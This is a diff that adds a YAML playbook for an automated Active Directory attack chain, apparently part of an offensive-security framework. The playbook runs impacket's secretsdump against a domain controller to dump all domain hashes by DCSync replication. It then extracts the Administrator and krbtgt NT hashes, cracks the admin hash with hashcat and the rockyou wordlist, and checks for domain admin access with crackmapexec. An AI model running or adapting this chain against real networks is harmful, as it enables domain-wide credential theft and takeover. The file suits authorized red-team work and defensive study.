@@ -1,0 +1,62 @@
+name: "DCSync Attack Chain"
+description: "Modern AD attack: gain replication rights, DCSync to dump all domain hashes, crack offline."
+category: ad
+attack_vector: "DCSync — replication-based credential dumping"
+variables:
+  target:
+    required: true
+    description: "Target DC IP"
+  domain:
+    required: true
+    description: "AD domain"
+  user:
+    required: true
+    description: "User with replication rights"
+  password:
+    required: true
+    description: "Password (or blank for hash)"
+cutting_edge: true
+references: ["MITRE ATT&CK T1003.006", "DCSync via replication rights"]
+
+steps:
+  - name: "secretsdump_dcsync"
+    tool: "impacket_tools"
+    description: "Dump domain secrets via DCSync replication"
+    args:
+      tool: "secretsdump"
+      target: "{{domain}}/{{user}}:{{password}}@{{target}}"
+    expected_output: "\\[\\*\\] Dumping Domain Credentials|Administrator:\\d+"
+    timeout: 600
+    gate: true
+    retries: 2
+    extracts:
+      - var: "admin_hash"
+        regex: "Administrator:\\d+:\\d+:([a-fA-F0-9]{32})"
+      - var: "krbtgt_hash"
+        regex: "krbtgt:\\d+:\\d+:([a-fA-F0-9]{32})"
+
+  - name: "crack_admin_hash"
+    tool: "hashcat_crack"
+    description: "Crack the administrator NT hash offline"
+    args:
+      hash_file: "output/secretsdump_dcsync.stdout.txt"
+      wordlist: "/usr/share/wordlists/rockyou.txt"
+      mode: 1000
+      attack_mode: 0
+    expected_output: null
+    timeout: 3600
+    gate: false
+    retries: 1
+
+  - name: "verify_domain_admin"
+    tool: "crackmapexec_exec"
+    description: "Verify domain admin access with cracked hash"
+    args:
+      target: "{{target}}"
+      protocol: "smb"
+      username: "Administrator"
+      password: "{{admin_hash}}"
+    expected_output: "Pwn3d|\\[\\+\\]"
+    timeout: 300
+    gate: false
+    retries: 1
